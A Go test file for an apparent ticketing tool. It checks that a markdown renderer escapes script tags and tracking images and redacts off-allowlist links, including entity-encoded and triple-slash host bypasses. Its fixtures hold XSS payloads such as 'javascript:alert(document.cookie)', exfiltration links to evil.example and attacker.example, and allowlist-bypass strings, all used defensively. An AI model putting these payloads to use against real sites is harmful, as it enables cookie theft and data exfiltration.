package output

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// hostileReport carries every §9.1 hazard at once: a raw script block, a raw
// tracking image, a markdown image on the same host, an off-list link, an
// allowlisted link and a javascript: destination.
const hostileReport = `# Daily

<script>alert(1)</script>

Inline <img src="https://tracker.example/pixel.gif" width="1"> pixel.

![chart](https://tracker.example/chart.png)

See [the exfil](https://evil.example/collect?body=secret) and
[the ticket](https://www.github.com/steve/shuttle/issues/1) and
[the payload](javascript:alert(document.cookie)).
`

func TestRenderRedactsHostileMarkdown(t *testing.T) {
	out, err := Render([]byte(hostileReport), []string{githubHost})
	if err != nil {
		t.Fatal(err)
	}
	got := string(out)

	for _, live := range []string{"<script", "<img"} {
		if strings.Contains(got, live) {
			t.Errorf("rendered a live %s element:\n%s", live, got)
		}
	}
	for _, escaped := range []string{
		"&lt;script&gt;alert(1)&lt;/script&gt;",
		`&lt;img src=&quot;https://tracker.example/pixel.gif&quot; width=&quot;1&quot;&gt;`,
	} {
		if !strings.Contains(got, escaped) {
			t.Errorf("want %s as text:\n%s", escaped, got)
		}
	}

	// The off-list link and the markdown image both lose their tag and keep
	// their text with the URL in parentheses.
	if !strings.Contains(got, "the exfil (https://evil.example/collect?body=secret)") {
		t.Errorf("off-list link was not redacted:\n%s", got)
	}
	if !strings.Contains(got, "chart (https://tracker.example/chart.png)") {
		t.Errorf("off-list image was not redacted:\n%s", got)
	}
	if strings.Contains(got, `href="https://evil.example`) {
		t.Errorf("off-list link kept an href:\n%s", got)
	}
	if strings.Contains(got, `href="javascript:`) {
		t.Errorf("javascript: reached an href:\n%s", got)
	}
	if !strings.Contains(got, "the payload (javascript:alert(document.cookie))") {
		t.Errorf("javascript: link was not redacted:\n%s", got)
	}

	// A subdomain of an allowed host keeps its anchor.
	if !strings.Contains(got, `<a href="https://www.github.com/steve/shuttle/issues/1">the ticket</a>`) {
		t.Errorf("allowlisted link lost its anchor:\n%s", got)
	}
}

func TestRenderLinkPolicy(t *testing.T) {
	tests := []struct {
		name     string
		markdown string
		want     string
	}{
		{"relative link", "[a](./notes.md)", `<a href="./notes.md">a</a>`},
		{"bare fragment", "[a](#section)", `<a href="#section">a</a>`},
		{"protocol relative", "[a](//evil.example/x)", "a (//evil.example/x)"},
		{"data url", "[a](data:text/html;base64,PHNjcmlwdD4=)", "a (data:text/html;base64,PHNjcmlwdD4=)"},
		{"allowed autolink", "<https://github.com/x>", `<a href="https://github.com/x">https://github.com/x</a>`},
		{"off-list autolink", "<https://evil.example/x>", "https://evil.example/x (https://evil.example/x)"},
		{"port on an allowed host", "[a](https://github.com:8443/x)", `<a href="https://github.com:8443/x">a</a>`},
		{"lookalike host", "[a](https://notgithub.com/x)", "a (https://notgithub.com/x)"},
		{"allowed image", "![alt](https://github.com/logo.png)", `<img src="https://github.com/logo.png" alt="alt">`},
		// mailto keeps its anchor in both spellings: it fetches nothing when the
		// message is displayed (§9.1).
		{"email autolink", "<steve@example.com>", `<a href="mailto:steve@example.com">steve@example.com</a>`},
		{"mailto link", "[mail Steve](mailto:steve@example.com)", `<a href="mailto:steve@example.com">mail Steve</a>`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render([]byte(tc.markdown+"\n"), []string{githubHost})
			if err != nil {
				t.Fatal(err)
			}
			if !strings.Contains(string(out), tc.want) {
				t.Errorf("got %s, want it to contain %s", out, tc.want)
			}
		})
	}
}

// A destination is decoded by goldmark on its way into the href, so a
// character reference or a backslash escape must not be able to spell a host
// past the allowlist: `&sol;` renders as `/`, which ends the host early.
func TestRenderDecodesDestinationsBeforeTheAllowlist(t *testing.T) {
	tests := []struct {
		name     string
		markdown string
		want     string
	}{
		{"named reference in a link", "[a](https://attacker.example&sol;.github.com/collect)", "a (https://attacker.example/.github.com/collect)"},
		{"decimal reference in a link", "[a](https://attacker.example&#47;.github.com/collect)", "a (https://attacker.example/.github.com/collect)"},
		{"hex reference in a link", "[a](https://attacker.example&#x2F;.github.com/collect)", "a (https://attacker.example/.github.com/collect)"},
		{"backslash escape in a link", `[a](https://attacker.example\/.github.com/collect)`, "a (https://attacker.example/.github.com/collect)"},
		{"named reference in an image", "![a](https://attacker.example&sol;.github.com/pixel.png)", "a (https://attacker.example/.github.com/pixel.png)"},
		{"hex reference in an image", "![a](https://attacker.example&#x2F;.github.com/pixel.png)", "a (https://attacker.example/.github.com/pixel.png)"},
		// The reference decodes inside the path, not the host, so the link is
		// on an allowed host and keeps its anchor.
		{"reference inside an allowed path", "[a](https://github.com/steve&sol;shuttle)", `<a href="https://github.com/steve/shuttle">a</a>`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render([]byte(tc.markdown+"\n"), []string{githubHost})
			if err != nil {
				t.Fatal(err)
			}
			got := string(out)
			if !strings.Contains(got, tc.want) {
				t.Errorf("got %s, want it to contain %s", got, tc.want)
			}
			if strings.Contains(got, "attacker.example") && strings.Contains(got, `="https://attacker.example`) {
				t.Errorf("off-list host reached an attribute:\n%s", got)
			}
		})
	}
}

// A destination url.Parse reads as a path can still be an authority to the
// browser resolving it against the HTTPS message body: ///attacker.example/x
// names the host, not a path. The relative-link exemption must not cover it.
func TestRenderRedactsSchemeRelativeDestinations(t *testing.T) {
	tests := []struct {
		name     string
		markdown string
		want     string
	}{
		{"triple slash link", "[a](///attacker.example/x)", "a (///attacker.example/x)"},
		{"triple slash image", "![pixel](///attacker.example/pixel?secret=value)", "pixel (///attacker.example/pixel?secret=value)"},
		{"slash run in a link", "[a](/////attacker.example/x)", "a (/////attacker.example/x)"},
		{"references spelling a triple slash", "[a](&sol;&sol;&sol;attacker.example/x)", "a (///attacker.example/x)"},
		{"space before the slashes", "[a]( ///attacker.example/x)", "a (///attacker.example/x)"},
		{"backslash after the slashes", `[a](//\attacker.example/x)`, "a (//%5Cattacker.example/x)"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render([]byte(tc.markdown+"\n"), []string{githubHost})
			if err != nil {
				t.Fatal(err)
			}
			got := string(out)
			if !strings.Contains(got, tc.want) {
				t.Errorf("got %s, want it to contain %s", got, tc.want)
			}
			for _, attr := range []string{"href=", "src="} {
				if strings.Contains(got, attr) {
					t.Errorf("kept an %s attribute:\n%s", attr, got)
				}
			}
		})
	}
}

func TestAllowHosts(t *testing.T) {
	store := t.TempDir()
	git(t, store, "init", "--initial-branch=main")
	git(t, store, "remote", "add", "origin", "git@git.example.com:steve/tickets.git")

	config := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(config, []byte("central_root: "+store+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	got := AllowHosts([]string{"Loom.example", "github.com"}, config)
	want := []string{"github.com", "git.example.com", "loom.example"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("got %v, want %v", got, want)
	}
}

// A store with no remote, and a tk config that is not there at all, each
// contribute no entry rather than failing (§9.1).
func TestAllowHostsWithoutRemote(t *testing.T) {
	store := t.TempDir()
	git(t, store, "init", "--initial-branch=main")
	config := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(config, []byte("central_root: "+store+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := AllowHosts(nil, config); strings.Join(got, ",") != githubHost {
		t.Errorf("got %v, want just %s", got, githubHost)
	}
	missing := filepath.Join(t.TempDir(), "nowhere.yaml")
	if got := AllowHosts(nil, missing); strings.Join(got, ",") != githubHost {
		t.Errorf("got %v, want just %s", got, githubHost)
	}
}

// The allowlist is assembled from the tk store's own remote: a GIT_DIR in the
// environment must not be able to contribute a host from another repository
// (§9.1).
func TestAllowHostsIgnoresAGitDirInTheEnvironment(t *testing.T) {
	store := t.TempDir()
	git(t, store, "init", "--initial-branch=main")
	git(t, store, "remote", "add", "origin", "git@git.example.com:steve/tickets.git")
	other := t.TempDir()
	git(t, other, "init", "--initial-branch=main")
	git(t, other, "remote", "add", "origin", "git@hijack.example:x/y.git")

	config := filepath.Join(t.TempDir(), "config.yaml")
	if err := os.WriteFile(config, []byte("central_root: "+store+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GIT_DIR", filepath.Join(other, ".git"))

	got := AllowHosts(nil, config)
	want := []string{githubHost, "git.example.com"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("got %v, want %v", got, want)
	}
}
